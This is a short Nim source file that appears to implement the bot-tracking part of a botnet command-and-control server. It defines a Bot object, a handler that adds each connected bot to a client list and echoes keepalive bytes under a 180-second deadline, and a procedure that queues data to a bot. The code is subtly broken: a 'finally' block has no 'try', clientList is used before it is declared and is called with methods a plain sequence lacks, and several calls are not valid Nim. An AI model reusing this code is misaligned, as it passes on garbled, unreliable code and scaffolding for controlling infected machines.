import net
import times

type Bot = ref object
  uid: int
  conn: Socket
  version: byte
  source: string

proc newBot(conn: Socket, version: byte, source: string): Bot =
  result = Bot(uid: -1, conn: conn, version: version, source: source)

proc handle(this: Bot) =
  clientList.addClient(this)
  finally:
    clientList.delClient(this)
  var buf: seq[uint8] = newSeqWithCap[uint8](2)
  while true:
    this.conn.setDeadline(now() + seconds(180))
    let n = this.conn.read(buf)
    if n.isNil or n.len != buf.len:
      return
    if this.conn.write(buf) != buf.len:
      return

proc queueBuf(this: Bot, buf: seq[uint8]) =
  this.conn.write(buf)

var clientList: seq[Bot] = @[]

